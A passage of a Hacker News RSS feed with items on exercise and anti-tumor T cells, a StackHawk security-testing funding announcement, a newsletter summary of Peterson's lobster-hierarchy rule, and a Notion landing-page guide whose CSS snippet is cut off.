<p>Next, the researchers examined the importance of cytotoxic T cells by injecting antibodies that remove these T cells in both trained and untrained mice. The antibodies knocked out the positive effect of exercise on both cancer growth and survival, which according to the researchers demonstrates the significance of these T cells for exercise-induced suppression of cancer.</p>

<p>The researchers also transferred cytotoxic T cells from trained to untrained mice with tumors, which improved their prospects compared with those who got cells from untrained animals.</p>

<h2>Exercise altered T cell metabolism</h2>

<p>To examine how exercise influenced cancer growth, the researchers isolated T cells, blood and tissue samples after a training sessions and measured levels of common metabolites that are produced in muscle and excreted into plasma at high levels during exertion. Some of these metabolites, such as lactate, altered the metabolism of the T cells and increased their activity. The researchers also found that T cells isolated from an exercised animal showed an altered metabolism compared to T cells from resting animals.</p>

<p>In addition, the researchers examined how these metabolites change in response to exercise in humans. They took blood samples from eight healthy men after 30 minutes of intense cycling and noticed that the same training-induced metabolites were released in humans.</p>

<p>“Our research shows that exercise affects the production of several molecules and metabolites that activate cancer-fighting immune cells and thereby inhibit cancer growth,” says <a href="https://staff.ki.se/people/helame">Helene Rundqvist</a>, senior researcher at the <a href="https://ki.se/en/labmed/department-of-laboratory-medicine">Department of Laboratory Medicine</a>, Karolinska Institutet, and the study’s first author. “We hope these results may contribute to a deeper understanding of how our lifestyle impacts our immune system and inform the development of new immunotherapies against cancer.”</p>

<p>The researchers have received financing from the Knut and Alice Wallenberg Foundation, the Swedish Research Council, the Swedish Cancer Society, the Swedish Childhood Cancer Foundation, the Swedish Society of Medicine, Cancer Research UK and the Wellcome Trust.</p>

<h2>Publication</h2>

<p>“<a href="https://elifesciences.org/articles/59996">Cytotoxic T-cells mediate an exercise-induced reduction in tumor growth</a>,”<strong> </strong>Helene Rundqvist, Pedro Veliça, Laura Barbieri, Paulo A. Gameiro, David Bargiela, Milos Gojkovic, Sara Mijwel, Stefan Reitzner, David Wullimann, Emil Ahlstedt, Jernej Ule, Arne Östman and Randall S. Johnson, <em>eLife</em>, online October 23, 2020, doi: 10.7554/eLife.59996</p>
      
      </div></div>]]>
            </description>
            <link>https://news.ki.se/study-shows-how-exercise-stalls-cancer-growth-through-the-immune-system</link>
            <guid isPermaLink="false">hacker-news-small-sites-24908425</guid>
            <pubDate>Tue, 27 Oct 2020 15:36:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[StackHawk Raises $10M Series A to Bring AppSec to Developers]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24908245">thread link</a>) | @sevs
<br/>
October 27, 2020 | https://www.stackhawk.com/blog/series-a-press-release/ | <a href="https://web.archive.org/web/*/https://www.stackhawk.com/blog/series-a-press-release/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="795a82f" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
			
<p>DENVER, CO — Oct 27, 2020 — Application security startup StackHawk announced today that it has raised a $10 million in Series A funding. The pre-emptive, oversubscribed round was led by <a href="https://sapphireventures.com/">Sapphire Ventures</a> and included return seed backers Foundry Group, Costanoa Ventures, Flybridge Capital, and Matchstick Ventures. Launched just over a year ago, StackHawk has seen significant demand as a platform that helps developers implement security testing before applications are pushed into production — a trend in the industry known as “shifting security left.”</p>



<p>With widespread adoption of DevOps over the past decade, companies are shipping software to production more frequently than before, with many companies pushing to production multiple times per day. The traditional models of application security testing such as quarterly penetration tests or scheduled scans of the production application have struggled to keep up with this shift, resulting in inefficiencies and increased risk exposure. Modern companies, however, are integrating application security into their DevOps practices, checking for vulnerabilities early in the software development life cycle. This approach vastly shortens the time to find and fix vulnerabilities, leading to efficient development and secure applications.</p>



<p>StackHawk is an application security testing platform that allows DevOps teams to instrument automated dynamic application security testing (DAST) in the CI/CD pipeline. With this approach, engineering teams can instrument automated testing with every pull request, ensuring that vulnerabilities are caught long before they hit production. And with a strong focus on features for software developers, application security can scale across the engineering organization, creating significant efficiencies in fixing security bugs.</p>



<p>Adrián Moreno Peña, Tech Lead at VanMoof, describes the company’s use of StackHawk, “At VanMoof we work fast and lean, in a DevOps-way of working with empowered teams using smart tools to handle their work. It was about time to find InfoSec tools that fit with our vision — high productivity tools, flexible, adaptable and created with developers in mind. Using StackHawk we can make our security improvement process transparent, actionable and easy to understand for each developer in the team, applying best practices and preventing security issues from going to production.”</p>



<p>The modern approach to application security also resonates with Katie Teitler, industry analyst at TAG Cyber. “Coming early into the development lifecycle is an attractive proposition, both for development lifecycles and for security teams,” said Teitler. “Since the platform is lightweight and quick to deploy through Docker, devs should feel instantly comfortable with it.”</p>



<p>The StackHawk founding team has leveraged their backgrounds in DevOps and security to build the product that puts application security in developer’s hands. Joni Klippert, StackHawk founder &amp; CEO, has spent the past decade building DevOps products, most recently as the VP, Product at VictorOps (acquired by Splunk).&nbsp;</p>



<p>“Digital Transformation has allowed for automation of many tasks associated with building, delivering and operating software in production. DevOps automation enables companies to deliver business value to their customers faster than ever before,” said Klippert. “However, security practices are not keeping up with the speed of modern software delivery. StackHawk empowers software engineers to deliver secure software to their customers at the speed of DevOps.”&nbsp;</p>



<p>The focus on integrating into the modern engineering workflow and building features for developers was a leading factor for Sapphire to lead the round. “With the rise of DevOps, companies have shifted to the frequent release of software and reliance on automation. How companies approach application security should be no different,” says David Hartwig, Managing Director at Sapphire Ventures. “We believe that StackHawk has the product and the team in place, led by Founder and CEO Joni Klippert, to deliver on developer-first automated application security testing in the DevOps pipeline, and we are excited to partner with them along their journey.”</p>



<p>With the additional capital, StackHawk will continue product development, invest in go-to-market teams, and continue to support ZAP, the open source project that the company’s platform is built upon.&nbsp;</p>



<p><strong>About StackHawk</strong><br>StackHawk, an application security SaaS startup in Denver, CO, empowers engineers to easily find and fix application security bugs at any stage of software development. With a strong founding team that has deep experience in security and DevOps, and some of the best venture investors in the business, StackHawk is putting application security testing into the hands of engineers. Learn more and sign up for a free trial at <a href="http://www.stackhawk.com/">www.stackhawk.com</a>.</p>



<p><strong>About Sapphire Ventures</strong><br>Sapphire Ventures is a venture capital firm focused on helping innovative technology companies become global category leaders. Leveraging nearly two decades of experience and an extensive global executive network, Sapphire invests capital, resources and expertise to enable its portfolio companies to scale rapidly through a powerful business development, marketing and talent platform. With more than $4 billion in assets under management across its Sapphire Ventures, Sapphire Partners and Sapphire Sport investment platforms, Sapphire is positioned to elevate companies across technology sectors to the global stage. To learn more about Sapphire Ventures, please see: <a href="https://sapphireventures.com/">https://sapphireventures.com/</a></p>








		</div>
				</div></div>]]>
            </description>
            <link>https://www.stackhawk.com/blog/series-a-press-release/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24908245</guid>
            <pubDate>Tue, 27 Oct 2020 15:20:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Takeaway Tuesday – Stand Up Straight with Your Shoulders Back]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24906813">thread link</a>) | @stanrivers
<br/>
October 27, 2020 | https://newsletter.butwhatfor.com/p/takeaway-tuesday-stand-up-straight | <a href="https://web.archive.org/web/*/https://newsletter.butwhatfor.com/p/takeaway-tuesday-stand-up-straight">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>Takeaway Tuesday</strong>&nbsp;on&nbsp;<strong><a href="https://amzn.to/2HaaKeZ">12 Rules for Life</a> - Rule 1: Stand Up Straight with Your Shoulders Back</strong></p><p><em>We appreciate all our subscribers’ ongoing support. Please continue to share with those who might also enjoy receiving our free newsletter. Any suggested materials for our Sunday newsletter can be sent to <a href="https://newsletter.butwhatfor.com/cdn-cgi/l/email-protection" data-cfemail="3f4c505c565e537f5d4a4b48575e4b59504d115c505211">[email&nbsp;protected]</a> Thank you!</em></p><p><strong><a href="https://www.butwhatfor.com/jordan-peterson/">Jordan B. Peterson</a></strong>&nbsp;is a Canadian clinical psychologist and psychology professor at the University of Toronto who became a controversial figure in late-2016 for his critiques of political correctness. Peterson’s most recent book, 12 Rules for Life, has sold over 3 million copies worldwide. Most recently, Peterson has suffered from health issues that necessitated a year-long reprieve from the public eye.</p><h4><strong>Success compounds, meaning those that win tend to continue to win</strong></h4><p>Lobsters are interesting animals, but most people don’t think about them too often. <a href="https://www.smithsonianmag.com/science-nature/dont-listen-to-the-buzz-lobsters-arent-actually-immortal-88450872/">While they may not be immortal as many like to think</a>, they never stop growing and can regenerate lost limbs. Unfortunately for them, they taste good with butter - but let’s circle back to lobsters here in a minute.</p><p>In the early 1900s, an Italian engineer, sociologist, economist, political scientist, and philosopher (but he was probably no fun at parties, so you got him there) named <a href="https://en.wikipedia.org/wiki/Vilfredo_Pareto#Economic_concepts">Vilfredo Pareto</a> became fascinated by the ideas of wealth and power - namely, how is wealth distributed across society? (Interestingly, he did not start this work until his forties, <a href="https://newsletter.butwhatfor.com/p/takeaway-friday-a-stoic-philosopher">so it is never too late to make a difference</a>.)</p><p>Ever diligent, he pulled data from the 1400s through his modern times and found the same pattern everywhere. Whereas people had previously assumed that wealth would be distributed in a flat, upward-sloping line from poor to rich, what Pareto found was in fact a hockey stick - a small percentage of the population holds a majority of the wealth.</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ffcb31aa6-3ff3-4fba-b50a-82da1fb89f75_700x400.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ffcb31aa6-3ff3-4fba-b50a-82da1fb89f75_700x400.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/fcb31aa6-3ff3-4fba-b50a-82da1fb89f75_700x400.png&quot;,&quot;height&quot;:400,&quot;width&quot;:700,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:110387,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></p><p>This kind of distribution - the most successful / most productive / largest “winners” continuously having a greater chunk of the pie - can be seen across many different fields.</p><blockquote><p>That same brutal principle of unequal distribution applies outside the financial domain—indeed, anywhere that creative production is required. The majority of scientific papers are published by a very small group of scientists. A tiny proportion of musicians produces almost all the recorded commercial music. Just a handful of authors sell all the books. A million and a half separately titled books (!) sell each year in the US. However, only five hundred of these sell more than a hundred thousand copies. Similarly, just four classical composers (Bach, Beethoven, Mozart, and Tchaikovsky) wrote almost all the music played by modern orchestras. Bach, for his part, composed so prolifically that it would take decades of work merely to hand-copy his scores, yet only a small fraction of this prodigious output is commonly performed...</p><p>It also applies to the population of cities (a very small number have almost all the people), the mass of heavenly bodies (a very small number hoard all the matter), and the frequency of words in a language (90 percent of communication occurs using just 500 words), among many other things. Sometimes it is known as the Matthew Principle (Matthew 25:29), derived from what might be the harshest statement ever attributed to Christ: “to those who have everything, more will be given; from those who have nothing, everything will be taken.”</p></blockquote><p>This idea was further expanded in the mid-1900s when British physicist <a href="https://en.wikipedia.org/wiki/Derek_J._de_Solla_Price">Derek Price</a> noticed that certain of his colleague were prolific publishers and others - well, not so much. In fact, Price could fit most domains of publication to a “law” stating that half of all papers are written by the square root of the number of all writers - if you had 100 papers written by 25 people, 50 papers would have been written by only 5 individuals. If it was 1,000 papers and 250 people, 500 papers were written by only 16 people. Thus, there was always an active minority generating the majority of the work.</p><p>These results can be understood as it relates to the compounding effects of resources - those that have previously “won” generally have access to the greatest resources and can more easily utilize those resources to achieve additional success. Those without resources cannot. </p><p>Thus, resources beget additional resources while losing resources restricts your ability to gain resources in the future - <em>winners are more likely to win again, and losers more likely to lose</em>.</p><p>However, there is also something going on in the brain that makes those that win more likely to pursue meaningful, productive activities again in the future.</p><h4>Your brain is aware of where you are within the winner-loser continuum and makes plans based on where it thinks you sit</h4><p>Back to the lobsters. Lobsters live in a cold, brutal world where things such as ideal lobster nests (think “safe hiding places”) and access to food are both paramount and scarce. This scarcity can result in conflict. So how do you determine which lobsters lay claim to the best nests?</p><p>As you might have guessed, they fight for them - and Peterson goes into detail on lobster confrontation rituals in his book. Important to this conversation is what happens in the brains of lobsters that win and lobsters that lose.</p><blockquote><p>A lobster loser’s brain chemistry differs importantly from that of a lobster winner. This is reflected in their relative postures. Whether a lobster is confident or cringing depends on the ratio of two chemicals that modulate communication between lobster neurons: serotonin and octopamine. Winning increases the ratio of the former to the latter.</p><p>A lobster with high levels of serotonin and low levels of octopamine is a cocky, strutting sort of shellfish, much less likely to back down when challenged. This is because serotonin helps regulate postural flexion. A flexed lobster extends its appendages so that it can look tall and dangerous, like Clint Eastwood in a spaghetti Western…</p><p>High serotonin/low octopamine characterizes the victor. The opposite neurochemical configuration, a high ratio of octopamine to serotonin, produces a defeated-looking, scrunched-up, inhibited, drooping, skulking sort of lobster, very likely to hang around street corners, and to vanish at the first hint of trouble.</p></blockquote><p>The lobster’s brain knows whether it just lost or won a fight. The victor confidently holds himself up high and the loser shirks from potential conflict. And this makes sense - it is advantageous to your survival to avoid conflict if you tend to lose because 1) you tend to lose and 2) having lost, you now have access to less advantageous resources (food and shelter). The winner is confident in his access to resources and knows, based on experience, that he can win future fights.</p><p>These changes in how the lobster orients itself to the world start deep within its brain, with levels of serotonin driving physical changes in the external lobster. This brain infrastructure is very similar to what sits inside humans, who also take into account where they are in the “tend to win and have resources / tend to lose and don’t have resources” continuum.</p><blockquote><p>The part of our brain that keeps track of our position in the dominance hierarchy is therefore <a href="https://newsletter.butwhatfor.com/p/takeaway-tuesday-knowing-history">exceptionally ancient and fundamental</a>.&nbsp;It is a master control system, modulating our perceptions, values,&nbsp;emotions, thoughts and actions…</p><p>The ancient part of your brain specialized for assessing dominance watches how you are treated by other people. On that evidence, it renders a determination of your value and assigns you a status. If you are judged by your peers as of little worth, the counter restricts serotonin availability. That makes you much more physically and psychologically reactive to any circumstance or event that might produce emotion, particularly if it is negative. You need that reactivity. Emergencies are common at the bottom, and you must be ready to survive.</p></blockquote><p>If you are lower on the totem pole, being constantly prepared for emergencies eventually takes its toll on you given your orientation towards short-term survival at the expense of long-term success. It impacts everything, from the way your body allocates resources to its immune system (long-term investment) to your fight-or-flight response sensitivity (expensive short-term preparedness). </p><p>But this all makes sense for the competitive world our ancestors grew up in. </p><blockquote><p>Unfortunately, that physical hyper-response, that constant alertness, burns up a lot of precious energy and physical resources. This response is really what everyone calls stress, and it is by no means only or even primarily psychological. It’s a reflection of the genuine constraints of unfortunate circumstances. When operating at the bottom, the ancient brain counter assumes that even the smallest unexpected&nbsp;impediment might produce an uncontrollable chain of negative events, which will have to be handled alone, as useful friends are rare indeed, on society’s fringes. You will therefore continually sacrifice what you could otherwise physically store for the future, using it up on heightened readiness and the possibility of immediate panicked action in the present… The physical demands of emergency preparedness will wear you down in every way.</p><p>If you have a high status, on the other hand, the counter’s cold, pre-reptilian mechanics assume that your niche is secure, productive and safe, and that you are well buttressed with social support. It thinks the chance that something will damage you is low and can be safely discounted. Change might be opportunity, instead of disaster. The serotonin flows plentifully. This renders you confident and calm, standing tall and straight, and much less on constant alert. Because your position is secure, the future is likely to be good for you. It’s worthwhile to think in the long term and plan for a better tomorrow.</p></blockquote><h4>Feedback loops can both hurt you and help you</h4><p>This whole process is an example of an <a href="https://en.wikipedia.org/wiki/Autocatalysis#:~:text=A%20single%20chemical%20reaction%20is,is%20called%20an%20autocatalytic%20reaction.">autocatalytic reaction</a> - a chemical reaction where one of the reaction products (in this case “losing”) …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://newsletter.butwhatfor.com/p/takeaway-tuesday-stand-up-straight">https://newsletter.butwhatfor.com/p/takeaway-tuesday-stand-up-straight</a></em></p>]]>
            </description>
            <link>https://newsletter.butwhatfor.com/p/takeaway-tuesday-stand-up-straight</link>
            <guid isPermaLink="false">hacker-news-small-sites-24906813</guid>
            <pubDate>Tue, 27 Oct 2020 12:39:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Guide to Notion Landing Pages]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 23 (<a href="https://news.ycombinator.com/item?id=24906774">thread link</a>) | @saviorand
<br/>
October 27, 2020 | https://optemization.com/notion-landing-page-guide | <a href="https://web.archive.org/web/*/https://optemization.com/notion-landing-page-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article id="notion-landing-page-guide"><div id="4ef8369dd07944578af5ecae07585f8f"><div id="ec8a50571edc41dea01826949daf52b2"><p><span><span>We at Optemization know a thing or two about  Notion landing pages. In fact, Tem published the first Notion website back in March 2020 (oh, how the world has changed). </span></span></p><p><span><span>Thanks in large to awesome projects like Super and Fruition, building websites on Notion became easier and faster. </span></span></p><p><span><span>Given the surge in popularity, I deciced to pen this comprehensive guide and create some duplicable blocks, so you can create your own Notion website in no time — enjoy 🙌</span></span></p></div></div><h2><span id="cc149452e88b42e8b29622443a589d9c"></span><span><span>🔑 An overview of the guide</span></span></h2><div id="c496b9ce8126498e85222feb210e850b"><div id="4e7f6e020650473a8d103736b9068090"><p><span><span>Making a landing page with Notion is easy to the point of enjoyable — you don't need any coding skills at all. It's also flexible — you can mix, match, and style various blocks to get the look and feel needed to present your idea (or product) just the right way.</span></span></p><p><span><span>This guide will walk you through every step of setting up your landing with Notion, publishing it to the web, adding analytics and custom styling. As a cherry on top, we've also curated 10 ready-made components that you can use to get your Notion landing page out in no time.</span></span></p></div></div><h2><span id="4b158c7e538e49518051b4d9b3d1f780"></span><span><span>🎯 Setting your landing page goals</span></span></h2><p><span><span>Landing pages are the best way to "sell" something, to tell people about a specific product, service or a resource, and make them do a specific action. </span></span></p><p><span><span>When user does an action, this is called "conversion", and usually landing pages are fine-tuned to get as much conversions as possible. Conversions could be anything: from subscribing to a newsletter or joining a community, to buying a product or a service. Landing pages can be purely informational, too. </span></span></p><p><span><span>Think what's the purpose of your page, and what the user needs to do to contribute.</span></span></p><h2><span id="cbfc301b7d274e27a06afc720d7eb511"></span><span><span>🤔 Deciding on what to show on the landing page</span></span></h2><p><span><span>Defining your goal was the hard part — after you know what action you want the user to make, it's easy to define what to show on your landing. </span></span></p><p><span><span>If they're subscribing to a newsletter, tell what it's about. If the goal is to grow a community, tell about the people already there and show what's the purpose of this community. If you're selling a product, focus on the value it offers and on core functionality. Don't forget call-to-actions to let the user actually realize their interest when they're convinced.</span></span></p><p><span><span>Take a look at </span><span><a target="_blank" rel="noopener noreferrer" href="https://demandcurve.com/#1opac8uusrjldfqjb39wpp">Demand Curve</a></span><span>'s landing page, for example. </span></span></p><div id="54fa9f431f9a45fc970d6e7fc90bf338"><picture><source srcset="https://api.super.so/asset/optemization.com/32e404a1-908e-4e9d-a0ca-dcce9c1e5edf.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/32e404a1-908e-4e9d-a0ca-dcce9c1e5edf.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/32e404a1-908e-4e9d-a0ca-dcce9c1e5edf.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/32e404a1-908e-4e9d-a0ca-dcce9c1e5edf.png?w=1500" alt="image" loading="lazy"></picture></div><p><span><span>They're advertising their start-up program, focusing on what the program is about, how it's structured and why people learn valuable things during that program. It's all there — right on the first screen you can see the bullet points describing what the program is about (Growth Strategy, Ads, etc.).</span></span></p><p><span><span>Demand Curve's team also put a special emphasis on social proof — there's a ton of different testimonials and stories from people on the page.</span></span></p><p><span><span>Sometimes short landing pages that span 1-2 screens have higher conversion that longer ones, that span 3 and more screens. When you need your user to perform a simple action, like sharing their email, a short page works better. Short landings also make more sense for "warm" clients who already know what you are offering.</span></span></p><p><span><span>Longer landings with lots of information work better for "cold" clients, because they need more context. After you have an idea on what size is appropriate in your case, you can start experimenting with content.</span></span></p><h2><span id="3812d49b74904f9d961961ff3c8b07b9"></span><span><span>🖋️ Adding some content</span></span></h2><p><span><span>On a typical landing page, the information is arranged into standard "blocks" with valuable information:  there's an eye-catching Hero image, simple text blocks describing your value proposition, a call-to-action that lets you collect interest, and a footer with terms. </span></span></p><p><span><span>Like on </span><span><a target="_blank" rel="noopener noreferrer" href="https://www.refactoringgrowth.com/">Refactoring Growth</a></span><span>'s landing page, you have an elaborate introduction, several sections with a value proposition (simple text) block and a picture or a graphic, a pricing block and a Call-to-Action.</span></span></p><div id="c32142c387d44b52b7995b22ae6c17c9"><picture><source srcset="https://api.super.so/asset/optemization.com/381f703e-7f47-4032-8bcb-2105ba4ea2b0.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/381f703e-7f47-4032-8bcb-2105ba4ea2b0.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/381f703e-7f47-4032-8bcb-2105ba4ea2b0.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/381f703e-7f47-4032-8bcb-2105ba4ea2b0.png?w=1500" alt="image" loading="lazy"></picture></div><p><span><span>Optionally, you can add more useful stuff. It's a good idea to include social proof (which is very important for conversions and creates a sense of community around your value prop), juicy product shots or screenshots and a blog section linking to your posts somewhere else. </span></span></p><div id="d3e8989030c247cba938e6e513c95e1d"><picture><source srcset="https://api.super.so/asset/optemization.com/a9051f9d-917c-4013-bde2-6b219dbfaa5d.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/a9051f9d-917c-4013-bde2-6b219dbfaa5d.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/a9051f9d-917c-4013-bde2-6b219dbfaa5d.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/a9051f9d-917c-4013-bde2-6b219dbfaa5d.png?w=1500" alt="image" loading="lazy"></picture></div><h2><span id="f07e89f0db6c4c5188083b57316e7685"></span><span><span>🎁 Ready-made landing page blocks</span></span></h2><p><span><span>We've assembled some common sections in Notion so you can borrow them for your website.</span></span></p><p><span><span>Just open the component you like below, click on the bookmark, then click "Duplicate" and drag your component's page into any page you like. Select "Turn into", then "text". You've got your landing page! Add some space between the blocks, change the content and delete the toggle. Then customize it as you like.</span></span></p><p><span><span>Here's a 53-second demo: </span></span></p><p><span><span>Mix and match the blocks and add your own section to make your own converting landing page in 10 minutes.</span></span></p><h2><span id="dbfa3c0dca5f4aada94f5376166f8281"></span><span><span>🌐 Publish your page to the web </span></span></h2><p><span><span>It's easy to publish your page and make it accessible from a custom domain. 
We like two services: </span><span><a target="_blank" rel="noopener noreferrer" href="https://fruitionsite.com/">Fruition</a></span><span> is free and open-source, while </span><span><a target="_blank" rel="noopener noreferrer" href="https://super.so/">Super</a></span><span> offers more functionality and better performance. </span></span></p><p><span><span>Fruition has a </span><span><a target="_blank" rel="noopener noreferrer" href="https://fruitionsite.com/">very elaborate guide</a></span><span> right on their home page, and a </span><span><a target="_blank" rel="noopener noreferrer" href="https://www.youtube.com/watch?v=aw0x54PzCaI">video tutorial</a></span><span>, and Super gives a good onboarding when you sign up, leading you through all the necessary steps. 

</span><span><span>Here's a step-by-step to get you going on Super:</span></span></span></p><ol><li id="30fa5f0ef68b4ad79354c951f1b9aba1"><span><span>Sign up, select a plan (essentially boils down to how many sites you need, keep in mind that one site can have many subpages, like any website on the Web)
</span></span></li><li id="787193987a0b4c7c95437a027e1bd716"><span><span>Select whether you want to make a static website out of your page, or go with a default Notion-based method. 

First option offers great performance, but doesn't allow for filtered views and calendars on your page. 

Default Notion page is relatively poor in terms of performance and SEO, but all Notion functionality will work and it's still enough for simple personal websites or pages where you don't need fast loading.
</span></span></li><ol></ol><li id="e44a993f1fce466193429d780f87fd90"><span><span>Select your site name used in Super, a custom domain from a domain provider, and the URL to your original Notion page with the page set to public via the "Share" menu at the top ("Share" → "Share to the Web")
</span></span></li><li id="2aa6fd185ae9449084ed3674d150ac83"><span><span>Add one or more pretty URLs if you need them. By default, all the sub-pages you add inside your home page will have ugly Notion URLs. You can change that by providing links to sub-pages you want to add slugs to and specifying the slug (e.g. </span><span><a target="_blank" rel="noopener noreferrer" href="http://optemization.com/preconceived">optemization.com/preconceived</a></span><span>)
</span></span></li><li id="ff4df464b80145149fe1675f38702e2b"><span><span>Add A and CNAME records to point Super to your domain name (Super provides these and you need to enter them in your domain provider's control panel). You can also provide an API Key if it's GoDaddy.</span></span></li><ol></ol><li id="52d2dce988b94c798bc7fafc30303552"><span><span>Enter your site's description, attach an image and an icon for social sharing. You can also select a custom font for your page's contents at this point.
</span></span></li></ol><p><span><span>Voila! The site should now be public. You're awesome.</span></span></p><h2><span id="728b3a07a7f3429b818b7992351d8dfa"></span><span><span>🔢 Add analytics</span></span></h2><p><span><span>With both Super and Fruition, you can inject your own Javascript into your page. This means you can use most of analytics solutions available.</span></span></p><p><span><span>For example, you can get your Fathom Analytics script to inject by going to Settings → Site → Site ID. Here's their own Fathom's </span><span><a target="_blank" rel="noopener noreferrer" href="https://usefathom.com/support/tracking">instruction</a></span><span>. Google Analytics also has a global site tag you can inject. </span></span></p><p><span><span>Both look like this (from Super's landing):</span></span></p><pre id="c777ed719650472ea7f2d1bb17322dd3"><code><span><pre><code><span>&lt;</span><span>script src</span><span>=</span><span>"https://cdn.analytics.com"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>script</span><span>&gt;</span></code></pre></span></code></pre><p><span><span>After you copy and paste the script into the right field in Super or with Fruition, it should should auto-magically start collecting your stats and you'll be able to see them in your analytics dashboard. These are statistics we measure for </span><span><a target="_blank" rel="noopener noreferrer" href="http://optemization.com/">optemization.com</a></span><span>:</span></span></p><h2><span id="4b1780ab79904f75abb4ecda48f54fd6"></span><span><span>✨Add styling </span></span></h2><p><span><span>In theory, with Super or Fruition you can style practically any part of your page. One of the simple things to do is to change default Notion colors. To change any color on your page just add a script (the same way you add an analytics script) that replaces Notion's CSS values.</span></span></p><p><span><span><a target="_blank" rel="noopener noreferrer" href="https://demo.super.so/guides/colors">Super</a></span><span> has a great mini-guide on doing that, below is the script with every default Notion color. Just replace the color you want to change with a HEX value (#000 for black, #fff for white) and delete the rest to change colors for a site hosted with Super (Fruition works the same way).</span></span></p><details id="cd15c584098c4a26b2e6aeadc95bd312"><summary><span><span>Notion's core colors (check the full list here: </span><span><span><a id="/fed8e0f6059d469fadaeeac47812b6e7" href="https://optemization.com/fed8e0f6059d469fadaeeac47812b6e7"><div><p><img src="https://super.so/icon/dark/hexagon.svg" alt="Notion Colors"></p><p><span><span>Notion Colors</span></span></p></div></a></span></span><span>)</span></span></summary><div><pre id="675898bed12c4045ac7bdd3c20ed3ae3"><code><span><pre><code><span>&lt;</span><span>style</span><span>&gt;</span><span>
</span><span>  </span><span>:</span><span>root </span><span>{</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>default</span><span>:</span><span> #</span><span>37352</span><span>f</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>default</span><span>-</span><span>light</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>55</span><span>,</span><span>53</span><span>,</span><span>47</span><span>,</span><span>0.6</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>gray</span><span>:</span><span> #</span><span>9</span><span>b9a97</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>brown</span><span>:</span><span> #</span><span>64473</span><span>a</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>orange</span><span>:</span><span> #d9730d</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>yellow</span><span>:</span><span> #dfab01</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>green</span><span>:</span><span> #</span><span>0</span><span>f7b6c</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>blue</span><span>:</span><span> #</span><span>0</span><span>b6e99</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>purple</span><span>:</span><span> #</span><span>6940</span><span>a5</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>pink</span><span>:</span><span> #ad1a72</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>text</span><span>-</span><span>red</span><span>:</span><span> #e03e3e</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>default</span><span>:</span><span> #fff</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>gray</span><span>:</span><span> #ebeced</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>brown</span><span>:</span><span> #e9e5e3</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>orange</span><span>:</span><span> #faebdd</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>yellow</span><span>:</span><span> #fbf3db</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>green</span><span>:</span><span> #ddedea</span><span>;</span><span>
